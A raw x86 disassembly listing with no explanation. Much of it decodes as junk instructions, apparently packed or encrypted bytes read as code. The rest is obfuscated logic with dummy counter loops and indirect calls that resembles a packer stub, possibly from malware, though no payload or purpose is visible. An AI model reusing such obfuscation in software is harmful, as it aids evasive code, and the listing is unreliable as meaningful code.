  415fdc:	sbb    DWORD PTR [edx+0x4106be3c],ebx
  415fe2:	and    DWORD PTR [esi+0x7c],edx
  415fe5:	sub    eax,0xba29c29b
  415fea:	push   es
  415feb:	pop    esi
  415fec:	popf   
  415fed:	jne    0x41604c
  415fef:	ret    
  415ff0:	dec    eax
  415ff1:	xchg   esi,eax
  415ff2:	shr    BYTE PTR [ebx+0x6e],cl
  415ff5:	dec    eax
  415ff6:	cmc    
  415ff7:	(bad)  
  415ff8:	bnd jg 0x415fca
  415ffb:	cmp    BYTE PTR [ebp-0x18],ch
  415ffe:	adc    al,0x5c
  416000:	mov    ebp,0x8cc22667
  416005:	sbb    al,0xb2
  416007:	inc    edx
  416008:	mov    ds:0x7b157618,eax
  41600d:	retf   
  41600e:	loopne 0x415fc3
  416010:	sbb    al,0x6
  416012:	xchg   esp,eax
  416013:	arpl   WORD PTR [ebx+ebx*1],bx
  416016:	scas   al,BYTE PTR es:[edi]
  416017:	inc    esp
  416018:	jmp    edi
  41601a:	shr    BYTE PTR ds:0x85ac0925,1
  416020:	mov    edx,0xf49df5e
  416025:	popa   
  416026:	shl    BYTE PTR [ecx],cl
  416028:	mov    edi,0x5276fa2e
  41602d:	jmp    0x1ddb:0x2f9b47d3
  416034:	sub    eax,0x94b094ec
  416039:	test   eax,0xb1660e39
  41603e:	mov    ch,0x6c
  416040:	pop    ss
  416041:	out    0xf8,eax
  416043:	sub    al,0x5
  416045:	push   es
  416046:	(bad)  
  416047:	stos   DWORD PTR es:[edi],eax
  416048:	mov    cs,WORD PTR [edx+eiz*4]
  41604b:	xchg   ebp,esp
  41604d:	or     esi,eax
  41604f:	mov    ebx,0x9c2862a4
  416054:	ins    BYTE PTR es:[edi],dx
  416055:	rep outs dx,BYTE PTR ds:[esi]
  416057:	stc    
  416058:	push   ss
  416059:	sub    DWORD PTR [edi],edx
  41605b:	or     dh,ch
  41605d:	jo     0x4160cd
  41605f:	mov    ah,0x15
  416061:	or     esi,DWORD PTR [ebx+0x7ea9b05d]
  416067:	je     0x416050
  416069:	xchg   bl,dl
  41606b:	push   ecx
  41606c:	gs or  eax,0x28a3b646
  416072:	data16 into 
  416074:	xchg   DWORD PTR [ebx],edx
  416076:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416077:	mov    ah,0x57
  416079:	pushf  
  41607a:	pop    eax
  41607b:	clc    
  41607c:	xor    edi,0x4cfa3b26
  416082:	and    cl,BYTE PTR [edx]
  416084:	jg     0x4160b9
  416086:	inc    ecx
  416087:	pextrw edi,mm6,0x57
  41608b:	sbb    BYTE PTR [esi-0x25266b1d],dh
  416091:	(bad)  
  416093:	out    0x10,eax
  416095:	pop    ss
  416096:	dec    edx
  416097:	push   cs
  416098:	test   BYTE PTR [eax+ebp*2+0x6e6954af],ch
  41609f:	data16 jmp 0x41610b
  4160a2:	xchg   ecx,eax
  4160a3:	pusha  
  4160a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160a5:	cwde   
  4160a6:	data16 daa 
  4160a8:	lahf   
  4160a9:	inc    edi
  4160aa:	push   ss
  4160ab:	push   ecx
  4160ac:	dec    ebp
  4160ad:	dec    eax
  4160ae:	sti    
  4160af:	outs   dx,BYTE PTR ds:[esi]
  4160b0:	inc    ebp
  4160b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160b2:	add    DWORD PTR [ebp-0x1d5aa569],0x7f
  4160b9:	cmp    eax,eax
  4160bb:	sti    
  4160bc:	dec    edi
  4160bd:	jb     0x416066
  4160bf:	(bad)  
  4160c0:	pop    edx
  4160c1:	or     DWORD PTR [esi+0x2736ad37],ecx
  4160c7:	pop    eax
  4160c8:	call   0x4ec0f385
  4160cd:	pop    edi
  4160ce:	scas   al,BYTE PTR es:[edi]
  4160cf:	js     0x416065
  4160d1:	hlt    
  4160d2:	mov    al,0xc0
  4160d4:	ss lahf 
  4160d6:	stos   BYTE PTR es:[edi],al
  4160d7:	push   0x33
  4160d9:	add    BYTE PTR [esi-0x25],0x7e
  4160dd:	ret    
  4160de:	mov    bh,0xa0
  4160e0:	sbb    edi,esi
  4160e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160e3:	pop    ebx
  4160e4:	mov    esp,0x76f2e06a
  4160e9:	retf   
  4160ea:	mov    esi,DWORD PTR [eax+0x5943cd68]
  4160f0:	jne    0x416149
  4160f2:	jmp    0xdd425ccd
  4160f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160f8:	add    DWORD PTR [ecx-0x48],ebx
  4160fb:	mov    ebp,0x3364ea8
  416100:	imul   esi,DWORD PTR [ecx],0x20
  416103:	mov    bl,0x8b
  416105:	scas   eax,DWORD PTR es:[edi]
  416106:	dec    esp
  416107:	lock sti 
  416109:	sbb    DWORD PTR [esi],0x2968ba5e
  41610f:	dec    ebp
  416110:	cmp    al,BYTE PTR [ebx]
  416112:	jb     0x416189
  416114:	fstp   QWORD PTR [ecx-0x4f8f0814]
  41611a:	mov    eax,ds:0x9ce5100
  41611f:	mov    edi,0x2e915e17
  416124:	inc    eax
  416125:	mov    ?,WORD PTR [ebp+0x4]
  416128:	pop    ecx
  416129:	push   esi
  41612a:	mov    ecx,DWORD PTR [esi-0x51]
  41612d:	adc    BYTE PTR [edx-0x187bc969],ch
  416133:	sub    DWORD PTR [ebx],esp
  416135:	ret    0x4da
  416138:	gs retf 
  41613a:	inc    ebp
  41613b:	push   eax
  41613c:	and    eax,0xc4c7f15c
  416141:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416142:	adc    dl,BYTE PTR [eax+eiz*1+0x56]
  416146:	ja     0x4160eb
  416148:	adc    BYTE PTR [edi-0x5fe547da],0x65
  41614f:	inc    ebp
  416150:	mov    dh,0x64
  416152:	sbb    ecx,DWORD PTR [ebp-0x2d3552f9]
  416158:	xlat   BYTE PTR ds:[ebx]
  416159:	xchg   bh,al
  41615b:	and    edi,DWORD PTR [ebx+0x40122c4b]
  416161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416162:	repz xchg ebx,eax
  416164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416165:	or     BYTE PTR [edx+ebx*8],dl
  416168:	aam    0xd4
  41616a:	sbb    eax,0x892447ff
  41616f:	add    al,0xa5
  416171:	mov    ch,0xd1
  416173:	shl    DWORD PTR [ecx+ebx*8+0x38],cl
  416177:	icebp  
  416178:	mov    edx,0x56e69e7e
  41617d:	jle    0x41613f
  41617f:	cmp    DWORD PTR [ebp+0x4e],esp
  416182:	pop    ebx
  416183:	dec    edx
  416184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416185:	sbb    dh,BYTE PTR [esi+0x57a31455]
  41618b:	lods   eax,DWORD PTR ds:[esi]
  41618c:	adc    bl,BYTE PTR [eax]
  41618e:	fcmovnb st,st(0)
  416190:	and    al,BYTE PTR [ecx+edi*8-0xa]
  416194:	popa   
  416195:	int3   
  416196:	out    0x16,al
  416198:	data16 xor dl,BYTE PTR [edx-0x30]
  41619c:	mov    cl,0xb6
  41619e:	fld    DWORD PTR [ebx+0x5760b76d]
  4161a4:	dec    esp
  4161a5:	(bad)  
  4161a6:	sub    ah,BYTE PTR [ebx+ebx*2]
  4161a9:	int    0x6f
  4161ab:	pop    ebp
  4161ac:	xor    al,0xb3
  4161ae:	in     al,0xa8
  4161b0:	mov    ecx,0x482086df
  4161b5:	add    al,0x56
  4161b7:	xchg   edi,eax
  4161b8:	(bad)  
  4161b9:	(bad)  
  4161ba:	pop    ss
  4161bb:	mov    edx,0xdcd6fce8
  4161c0:	in     eax,dx
  4161c1:	sub    al,0xc4
  4161c3:	lds    eax,FWORD PTR [ecx-0x12eef844]
  4161c9:	push   esp
  4161ca:	jecxz  0x416174
  4161cc:	add    al,0xed
  4161ce:	or     BYTE PTR [eax],0x5b
  4161d1:	sbb    BYTE PTR [esi-0x71],ch
  4161d4:	push   ebp
  4161d5:	cmc    
  4161d6:	sti    
  4161d7:	retf   
  4161d8:	call   0x5f9f24ef
  4161dd:	add    ah,dh
  4161df:	outs   dx,DWORD PTR ds:[esi]
  4161e0:	add    edx,esp
  4161e2:	or     al,BYTE PTR [ecx]
  4161e4:	jmp    0x4161a8
  4161e6:	loopne 0x4161d5
  4161e8:	imul   edx,DWORD PTR [eax+0x7660482d],0xfffffff3
  4161ef:	push   esi
  4161f0:	cli    
  4161f1:	fld    TBYTE PTR [eax-0x1b]
  4161f4:	cmp    BYTE PTR [ebx-0x3b],0xc5
  4161f8:	repz ja 0x416193
  4161fb:	sub    eax,DWORD PTR [ecx-0x73]
  4161fe:	sub    edi,DWORD PTR [edx+0x7a1a6bd]
  416204:	sbb    eax,0xef40065f
  416209:	(bad)  [eax]
  41620b:	jno    0x41624d
  41620d:	sub    al,BYTE PTR [edx+0x6bb06d1b]
  416213:	outs   dx,DWORD PTR ds:[esi]
  416214:	xchg   edx,ebx
  416216:	sub    eax,0xc23e1fd7
  41621b:	shl    DWORD PTR [edi],0xee
  41621e:	fild   DWORD PTR ds:0x9f80e1d6
  416224:	fistp  DWORD PTR [esp+ecx*8-0x67]
  416228:	test   DWORD PTR [esi],esi
  41622a:	lods   eax,DWORD PTR ds:[esi]
  41622b:	fwait
  41622c:	ja     0x4161f6
  41622e:	in     al,0x22
  416230:	jae    0x416288
  416232:	pop    ds
  416233:	fucomi st,st(1)
  416235:	iret   
  416236:	addr16 iret 
  416238:	xor    al,0x8b
  41623a:	xor    esi,DWORD PTR [edi-0x19]
  41623d:	adc    al,0x7
  41623f:	out    0x57,al
  416241:	or     edx,0xa8d562e4
  416247:	outs   dx,DWORD PTR ds:[esi]
  416248:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416249:	fs jle 0x416207
  41624c:	xchg   DWORD PTR [edi-0x7e],esp
  41624f:	mov    al,ds:0x9b408a20
  416254:	sysexit 
  416256:	push   esp
  416257:	call   ecx
  416259:	inc    esp
  41625a:	cld    
  41625b:	xlat   BYTE PTR ds:[ebx]
  41625c:	(bad)  
  41625d:	jmp    0x9357:0xd534889f
  416264:	fucomi st,st(5)
  416266:	cmc    
  416267:	cmp    cl,dl
  416269:	out    0xfa,al
  41626b:	lahf   
  41626c:	push   ss
  41626d:	outs   dx,BYTE PTR ds:[esi]
  41626e:	add    BYTE PTR [esi+0x343740a4],dl
  416274:	pop    eax
  416275:	xchg   BYTE PTR [ebx-0x3f5ac39b],al
  41627b:	outs   dx,BYTE PTR ds:[esi]
  41627c:	mov    ds,WORD PTR [edi-0x667c050c]
  416282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416283:	adc    esi,esp
  416285:	xchg   ecx,eax
  416286:	outs   dx,BYTE PTR ds:[esi]
  416287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416288:	nop
  416289:	push   0x57a0c27e
  41628e:	cwde   
  41628f:	sbb    edi,0xeb6ef6f9
  416295:	adc    DWORD PTR [eax+0x2ab06ab8],edi
  41629b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41629c:	sbb    al,0x56
  41629e:	mov    ah,0x73
  4162a0:	jae    0x4162e8
  4162a2:	jge    0x4162f6
  4162a4:	mov    edx,0x6976f77b
  4162a9:	sbb    ah,dh
  4162ab:	(bad)  
  4162ac:	mov    eax,0xbf944659
  4162b1:	test   al,0x7f
  4162b3:	inc    edi
  4162b4:	pusha  
  4162b5:	adc    ebp,DWORD PTR [edx-0x3c]
  4162b8:	push   ebp
  4162b9:	lds    eax,FWORD PTR [ebp-0x7d6c7d6a]
  4162bf:	stos   BYTE PTR es:[edi],al
  4162c0:	enter  0x96bf,0xdb
  4162c4:	retf   0xf0da
  4162c7:	mov    al,0x15
  4162c9:	or     edx,ebx
  4162cb:	mov    ds:0x974d720c,eax
  4162d0:	xchg   ebp,eax
  4162d1:	retf   
  4162d2:	jmp    0x41630f
  4162d4:	daa    
  4162d5:	outs   dx,BYTE PTR ds:[esi]
  4162d6:	mov    ah,0xbc
  4162d8:	aad    0x43
  4162da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162db:	call   0xed1d54ad
  4162e0:	leave  
  4162e1:	fnsave [ecx-0x53d0ece]
  4162e7:	enter  0x643,0x90
  4162eb:	je     0x4162b9
  4162ed:	jae    0x416275
  4162ef:	adc    DWORD PTR [ebx-0x45],esp
  4162f2:	adc    ah,al
  4162f4:	jns    0x4162fe
  4162f6:	add    bh,BYTE PTR [ecx-0x20]
  4162f9:	or     eax,0x5343526
  4162fe:	out    0x18,al
  416300:	add    DWORD PTR [eax],ebx
  416302:	inc    edx
  416303:	in     al,dx
  416304:	cmp    BYTE PTR [ebp+0x43b7acb1],bl
  41630a:	dec    edi
  41630b:	and    edx,DWORD PTR [ebx]
  41630d:	mov    al,ds:0x710c5e93
  416312:	dec    eax
  416313:	sbb    DWORD PTR [ecx+0x1e972cb],ebp
  416319:	stos   BYTE PTR es:[edi],al
  41631a:	ja     0x4162e1
  41631c:	mov    dl,0x6c
  41631e:	daa    
  41631f:	sti    
  416320:	sub    BYTE PTR [ebp-0x33973da0],ah
  416326:	jnp    0x41632c
  416328:	dec    esi
  416329:	xor    BYTE PTR [edi],dh
  41632b:	adc    eax,0x8f809b8e
  416330:	arpl   WORD PTR [eax-0x18],bx
  416333:	ja     0x416379
  416335:	pop    edi
  416336:	mov    bl,0xe0
  416338:	add    bl,BYTE PTR [ebp+0xc776a9d]
  41633e:	ins    DWORD PTR es:[edi],dx
  41633f:	push   esi
  416340:	mov    cl,0x82
  416342:	fistp  QWORD PTR [ecx+0x58]
  416345:	xchg   BYTE PTR [ebp-0x6e],dh
  416348:	or     eax,0x226cb76a
  41634d:	js     0x41634f
  41634f:	das    
  416350:	mov    esp,0x1dd259da
  416355:	test   DWORD PTR [ecx],0x90b5da4e
  41635b:	in     al,dx
  41635c:	push   ebp
  41635d:	jbe    0x4162e7
  41635f:	sbb    eax,0x2e3a9d62
  416364:	xor    ch,cl
  416366:	out    dx,eax
  416367:	or     DWORD PTR [edi],edx
  416369:	daa    
  41636a:	mov    eax,0x9198011a
  41636f:	pop    edi
  416370:	call   DWORD PTR [esi]
  416372:	pop    edi
  416373:	mov    ah,0xf6
  416375:	stc    
  416376:	or     DWORD PTR [edx+edx*1],esi
  416379:	pop    ds
  41637a:	aas    
  41637b:	imul   esi,DWORD PTR [ecx+0x69be61fa],0x73
  416382:	jnp    0x416336
  416384:	or     ecx,DWORD PTR [eax+0x4ac22824]
  41638a:	lods   al,BYTE PTR ds:[esi]
  41638b:	sar    DWORD PTR [esi],0x5f
  41638e:	sbb    edi,DWORD PTR [ebx+0x26770e3c]
  416394:	ja     0x4163c8
  416396:	jecxz  0x4163e6
  416398:	mov    esp,0x460770ab
  41639d:	mov    al,0x66
  41639f:	data16 xor dl,dl
  4163a2:	cmp    DWORD PTR [eax],ecx
  4163a4:	aaa    
  4163a5:	cs (bad) 
  4163a7:	jns    0x416371
  4163a9:	adc    DWORD PTR [esi+0x30497389],edx
  4163af:	mov    ah,0x7e
  4163b1:	jp     0x41639e
  4163b3:	repnz adc ebp,ecx
  4163b6:	add    dl,BYTE PTR [esi+0x71]
  4163b9:	push   edi
  4163ba:	push   ss
  4163bb:	mov    BYTE PTR [edi-0x19],cl
  4163be:	loope  0x416417
  4163c0:	das    
  4163c1:	aad    0x5
  4163c3:	call   0xb8b412c7
  4163c8:	xor    BYTE PTR [edi+0x7d1b3e21],0xb1
  4163cf:	xor    eax,0x6d2acb35
  4163d4:	mov    dh,0x6c
  4163d6:	shl    DWORD PTR [esi+0x409087dc],cl
  4163dc:	rol    DWORD PTR [ebx],cl
  4163de:	gs dec ebx
  4163e0:	outs   dx,DWORD PTR ds:[esi]
  4163e1:	or     ebp,DWORD PTR [ebp+0x577fadf7]
  4163e7:	or     dl,BYTE PTR [eax-0x22359cb3]
  4163ed:	nop
  4163ee:	cmp    ebp,DWORD PTR [esi+0x29]
  4163f1:	pop    ebx
  4163f2:	sub    BYTE PTR [ecx],dl
  4163f4:	cdq    
  4163f5:	and    dh,BYTE PTR [edi-0x61]
  4163f8:	test   DWORD PTR [esi],ebx
  4163fa:	mov    eax,ds:0xe54f38e5
  4163ff:	xchg   ebp,eax
  416400:	in     eax,dx
  416401:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416403:	xor    al,0xd4
  416405:	mov    ebp,0x479176dc
  41640a:	sbb    BYTE PTR [edi+ebp*4],ah
  41640d:	lods   eax,DWORD PTR ds:[esi]
  41640e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41640f:	jns    0x416462
  416411:	lds    ebp,FWORD PTR [eax]
  416413:	call   0x7bf9:0xd8a6bfab
  41641a:	pop    esi
  41641b:	daa    
  41641c:	adc    eax,0xd550333f
  416421:	mov    ecx,0x7b3fd661
  416426:	pop    ebp
  416427:	and    esp,DWORD PTR [edx-0x420c5d06]
  41642d:	mov    bh,0xd0
  41642f:	jmp    0x416463
  416431:	pop    eax
  416432:	jne    0x41647c
  416434:	out    0x33,al
  416436:	push   ebx
  416437:	test   eax,0x62e62272
  41643c:	(bad)
  41643f:	clc    
  416440:	pusha  
  416441:	xchg   esi,eax
  416442:	jne    0x4163e9
  416444:	mov    eax,0xbf51fd69
  416449:	push   0x32cb47dd
  41644e:	mov    ebp,0x9db84a58
  416453:	dec    edi
  416454:	mov    al,ds:0x7f449349
  416459:	dec    esp
  41645a:	(bad)  
  41645b:	mov    ebp,0xec5d395
  416460:	arpl   dx,cx
  416462:	cdq    
  416463:	dec    esp
  416464:	sub    eax,0x7b9a12da
  416469:	jae    0x416444
  41646b:	push   ecx
  41646c:	xor    DWORD PTR [edx+0x2b],eax
  41646f:	cs addr16 push cx
  416473:	jl     0x41641e
  416475:	sub    BYTE PTR [esi+0x57],ah
  416478:	cmp    eax,0x268ee368
  41647d:	shr    BYTE PTR [esi-0x39],0x65
  416481:	test   DWORD PTR [eax*1+0x15b49d9b],edx
  416488:	push   ebx
  416489:	hlt    
  41648a:	inc    esp
  41648b:	push   ds
  41648c:	ud0    edx,edi
  41648f:	mov    DWORD PTR [eax],esi
  416491:	or     al,0x75
  416493:	lods   al,BYTE PTR ds:[esi]
  416494:	sbb    ecx,DWORD PTR [esi]
  416496:	add    eax,0xacb418b4
  41649b:	std    
  41649c:	popf   
  41649d:	push   0xffffffc4
  41649f:	xchg   esp,eax
  4164a0:	and    bl,BYTE PTR [ebp+ebx*1-0x1f]
  4164a4:	cs fucomi st,st(2)
  4164a7:	inc    esi
  4164a8:	mov    ebp,0xcb0b3b98
  4164ad:	sahf   
  4164ae:	cmc    
  4164af:	and    eax,0x93842fb8
  4164b4:	mov    ah,0x51
  4164b6:	aam    0x1e
  4164b8:	mov    eax,0x977206e3
  4164bd:	fild   DWORD PTR [edi+0x35]
  4164c0:	push   eax
  4164c1:	sub    BYTE PTR [ebx+0x38b0c0fb],ch
  4164c7:	(bad)  
  4164c8:	call   0xa3f77d3e
  4164cd:	call   0x2f8b:0xf66caaf4
  4164d4:	ins    BYTE PTR es:[edi],dx
  4164d5:	dec    ecx
  4164d6:	sti    
  4164d7:	dec    ebp
  4164d8:	pop    edx
  4164d9:	add    DWORD PTR [ecx+0x14],ebp
  4164dc:	lahf   
  4164dd:	jns    0x4164e7
  4164df:	push   edx
  4164e0:	cmp    al,0x63
  4164e2:	hlt    
  4164e3:	mov    eax,ds:0x85ec7222
  4164e8:	xchg   esp,eax
  4164e9:	push   ebp
  4164ea:	loop   0x41646c
  4164ec:	loope  0x416530
  4164ee:	repnz push cs
  4164f0:	(bad)  
  4164f1:	sbb    BYTE PTR ds:0xfee60404,dl
  4164f7:	add    BYTE PTR [esi-0x5c3bb392],bh
  4164fd:	push   esi
  4164fe:	inc    eax
  4164ff:	xlat   BYTE PTR ds:[ebx]
  416500:	pop    ss
  416501:	daa    
  416502:	add    al,0xfb
  416504:	jmp    0x8024:0x53103672
  41650b:	xor    dh,BYTE PTR [edx-0xf9feefa]
  416511:	mov    cl,0xb3
  416513:	xor    BYTE PTR [edx-0x22],bl
  416516:	sub    esp,DWORD PTR [ecx]
  416518:	cwde   
  416519:	dec    ebp
  41651a:	shl    DWORD PTR [edx],cl
  41651c:	mov    edx,0xe1023669
  416521:	push   es
  416522:	pop    edi
  416523:	cdq    
  416524:	xchg   ebx,eax
  416525:	outs   dx,BYTE PTR ds:[esi]
  416526:	ret    0xab9a
  416529:	fidiv  WORD PTR [esi+eiz*1-0x35e3327e]
  416530:	jle    0x416570
  416532:	jmp    0xbb1f:0x686981e6
  416539:	xor    eax,0x5b1f55ed
  41653e:	jle    0x4165b3
  416540:	jle    0x41656c
  416542:	movzx  ecx,WORD PTR ss:[ecx+edx*4]
  416547:	xor    DWORD PTR ds:0x428ea7,0x428e77
  416551:	xor    ecx,0x8a9b
  416557:	mov    DWORD PTR ds:0x428ea3,0x5f74
  416561:	add    ecx,edi
  416563:	mov    edi,DWORD PTR [ebp-0xc]
  416566:	mov    DWORD PTR ds:0x428e73,0x23ca
  416570:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  416577:	inc    edx
  416578:	mov    ecx,DWORD PTR [ebp-0x10]
  41657b:	mov    DWORD PTR ds:0x428e37,0x4a6a
  416585:	cmp    edx,ecx
  416587:	mov    DWORD PTR ds:0x428e73,0x3902
  416591:	jne    0x414140
  416597:	mov    ecx,DWORD PTR [ebp-0x18]
  41659a:	mov    DWORD PTR ds:0x428ebf,0x19
  4165a4:	cmp    DWORD PTR ds:0x428ebf,0x0
  4165ab:	je     0x4165e3
  4165b1:	cmp    DWORD PTR ds:0x428ebf,0x1d
  4165b8:	jle    0x4165e3
  4165be:	jmp    0x4165d1
  4165c3:	push   DWORD PTR [ebp-0x14]
  4165c6:	push   0x8b92
  4165cb:	call   DWORD PTR ds:0x42aa23
  4165d1:	mov    edx,DWORD PTR ds:0x428ebf
  4165d7:	dec    edx
  4165d8:	mov    DWORD PTR ds:0x428ebf,edx
  4165de:	jmp    0x4165a4
  4165e3:	mov    edx,DWORD PTR [ebp+0x10]
  4165e6:	and    DWORD PTR ds:0x428e83,0x0
  4165f0:	mov    edi,DWORD PTR ds:0x428e83
  4165f6:	inc    edi
  4165f7:	mov    DWORD PTR ds:0x428e83,edi
  4165fd:	cmp    DWORD PTR ds:0x428e83,0x2c
  416604:	jg     0x416627
  41660a:	jmp    0x41661a
  41660f:	push   0x428e8f
  416614:	call   DWORD PTR ds:0x42aa27
  41661a:	cmp    DWORD PTR ds:0x428e83,0x1e
  416621:	jb     0x4165f0
  416627:	xor    ecx,eax
  416629:	add    DWORD PTR ds:0x428e97,edx
  41662f:	add    ecx,esi
  416631:	xor    DWORD PTR ds:0x428e57,edx
  416637:	mov    DWORD PTR [edx],ecx
  416639:	sbb    edi,ecx
  41663b:	mov    ecx,DWORD PTR [ebp-0x18]
  41663e:	xor    DWORD PTR ds:0x428ec7,ebx
  416644:	xor    ecx,eax
  416646:	add    ecx,esi
  416648:	mov    DWORD PTR ds:0x428ebb,0x1e
  416652:	cmp    DWORD PTR ds:0x428ebb,0x0
  416659:	je     0x4166a8
  41665f:	cmp    DWORD PTR ds:0x428ebb,0x2
  416666:	jbe    0x4166a8
  41666c:	jmp    0x41667c
  416671:	push   0x71f6
  416676:	call   DWORD PTR ds:0x42aa2b
  41667c:	cmp    DWORD PTR ds:0x428ebb,0x3
  416683:	jne    0x416696
  416689:	mov    edi,DWORD PTR ds:0x428ebb
  41668f:	dec    edi
  416690:	mov    DWORD PTR ds:0x428ebb,edi
  416696:	mov    edi,DWORD PTR ds:0x428ebb
  41669c:	dec    edi
  41669d:	mov    DWORD PTR ds:0x428ebb,edi
  4166a3:	jmp    0x416652
  4166a8:	mov    DWORD PTR [ebp-0xc],ecx
  4166ab:	sbb    DWORD PTR ds:0x428eab,0x39c1
  4166b5:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4166bc:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4166c3:	sbb    edi,ecx
  4166c5:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4166cc:	mov    DWORD PTR ds:0x428e6f,0x17
  4166d6:	cmp    DWORD PTR ds:0x428e6f,0x0
  4166dd:	je     0x41671c
  4166e3:	cmp    DWORD PTR ds:0x428e6f,0x23
  4166ea:	jl     0x41671c
  4166f0:	jmp    0x41670a
  4166f5:	push   0x4cf4
  4166fa:	push   0x428e23
  4166ff:	push   0x15e1
  416704:	call   DWORD PTR ds:0x42aa2f
  41670a:	mov    edi,DWORD PTR ds:0x428e6f
  416710:	dec    edi
  416711:	mov    DWORD PTR ds:0x428e6f,edi
  416717:	jmp    0x4166d6
  41671c:	mov    ecx,DWORD PTR [ebp-0x14]
  41671f:	add    edi,DWORD PTR ds:0x428e3f
  416725:	mov    DWORD PTR [ebp+0x8],ecx
  416728:	sub    edi,0x632b
  41672e:	mov    ecx,DWORD PTR [ebp+0x8]
  416731:	xor    DWORD PTR ds:0x428e53,edi
  416737:	xor    ecx,eax
  416739:	mov    edi,DWORD PTR ds:0x428e9b
  41673f:	adc    DWORD PTR ds:0x428ebb,edi
  416745:	add    ecx,esi
  416747:	mov    edi,DWORD PTR ds:0x428e43
  41674d:	mov    ecx,0x242ebf1
  416752:	mov    edi,0xf641bf2
  416757:	mov    DWORD PTR ds:0x428e77,0x250d
  416761:	je     0x4191f8
  416767:	mov    edx,DWORD PTR [ebp+0x8]
  41676a:	mov    ebx,DWORD PTR [ebp-0x8]
  41676d:	neg    DWORD PTR ds:0x428e8f
  416773:	xor    edx,eax
  416775:	xor    ebx,eax
  416777:	sub    edx,ebx
  416779:	xor    DWORD PTR ds:0x428e63,edx
  41677f:	sub    edx,esi
  416781:	add    DWORD PTR ds:0x428eaf,0x644f
  41678b:	xor    edx,eax
  41678d:	or     DWORD PTR ds:0x428e27,0x4378
  416797:	mov    DWORD PTR [ebp+0x8],edx
  41679a:	and    DWORD PTR ds:0x428e67,0x0
  4167a4:	mov    edx,DWORD PTR ds:0x428e67
  4167aa:	inc    edx
  4167ab:	mov    DWORD PTR ds:0x428e67,edx
  4167b1:	cmp    DWORD PTR ds:0x428e67,0xe
  4167b8:	jl     0x4167f7
  4167be:	jmp    0x4167ce
  4167c3:	push   0x428111
  4167c8:	call   DWORD PTR ds:0x42a9fb
  4167ce:	cmp    DWORD PTR ds:0x428e67,0xd
  4167d5:	jne    0x4167ea
  4167db:	xor    edx,edx
  4167dd:	xor    edx,DWORD PTR ds:0x428e67
  4167e3:	inc    edx
  4167e4:	mov    DWORD PTR ds:0x428e67,edx
  4167ea:	cmp    DWORD PTR ds:0x428e67,0x1e
  4167f1:	jb     0x4167a4
  4167f7:	mov    edx,DWORD PTR [ebp+0x8]
  4167fa:	mov    ebx,DWORD PTR [ebp-0x58]
  4167fd:	adc    DWORD PTR ds:0x428eaf,0x428e9b
  416807:	add    edx,0x5708e4
  41680d:	imul   edx,ebx
  416810:	mov    ebx,DWORD PTR ds:0x428e87
  416816:	or     DWORD PTR ds:0x428e57,ebx
  41681c:	mov    DWORD PTR [ebp-0x58],edx
  41681f:	mov    edx,DWORD PTR ds:0x42973f
  416825:	mov    ebx,DWORD PTR ds:0x429bbf
  41682b:	sub    ebx,edx
  41682d:	xor    edx,DWORD PTR [edx+ebx*1]
  416830:	mov    edx,DWORD PTR [ebp+0x8]
  416833:	mov    ebx,DWORD PTR [ebp-0x54]
  416836:	xor    DWORD PTR ds:0x428e5b,0x428e83
  416840:	add    edx,0x64f882
  416846:	and    DWORD PTR ds:0x428eab,0x41a4
  416850:	or     edx,ebx
  416852:	and    DWORD PTR ds:0x428e53,0x0
  41685c:	mov    ebx,DWORD PTR ds:0x428e53
  416862:	inc    ebx
  416863:	mov    DWORD PTR ds:0x428e53,ebx
  416869:	cmp    DWORD PTR ds:0x428e53,0x1d
  416870:	ja     0x416893
  416876:	jmp    0x416886
  41687b:	push   0x42815b
  416880:	call   DWORD PTR ds:0x42a9ff
  416886:	cmp    DWORD PTR ds:0x428e53,0x11
  41688d:	jb     0x41685c
  416893:	mov    DWORD PTR [ebp-0x54],edx
  416896:	mov    DWORD PTR ds:0x428e83,0x1e
  4168a0:	cmp    DWORD PTR ds:0x428e83,0x0
  4168a7:	je     0x4168f8
  4168ad:	cmp    DWORD PTR ds:0x428e83,0xe
  4168b4:	jb     0x4168f8
  4168ba:	jmp    0x4168ca
  4168bf:	push   0x8096
  4168c4:	call   DWORD PTR ds:0x42aa03
  4168ca:	cmp    DWORD PTR ds:0x428e83,0xf
  4168d1:	jne    0x4168e6
  4168d7:	xor    edx,edx
  4168d9:	add    edx,DWORD PTR ds:0x428e83
  4168df:	dec    edx
  4168e0:	mov    DWORD PTR ds:0x428e83,edx
  4168e6:	mov    edx,DWORD PTR ds:0x428e83
  4168ec:	dec    edx
  4168ed:	mov    DWORD PTR ds:0x428e83,edx
  4168f3:	jmp    0x4168a0
  4168f8:	mov    edx,DWORD PTR [ebp+0x8]
  4168fb:	mov    ebx,DWORD PTR [ebp-0x50]
  4168fe:	sub    DWORD PTR ds:0x428e8b,0x428e67
  416908:	add    edx,ecx
  41690a:	xor    edx,ebx
  41690c:	xor    DWORD PTR ds:0x428e73,0x75fe
  416916:	mov    DWORD PTR [ebp-0x50],edx
  416919:	sbb    DWORD PTR ds:0x428eaf,0x1c33
  416923:	mov    edx,DWORD PTR [ebp+0x8]
  416926:	adc    DWORD PTR ds:0x428e4b,edx
  41692c:	mov    ebx,DWORD PTR [ebp-0x4c]
  41692f:	sbb    DWORD PTR ds:0x428e73,0x359
  416939:	add    edx,edi
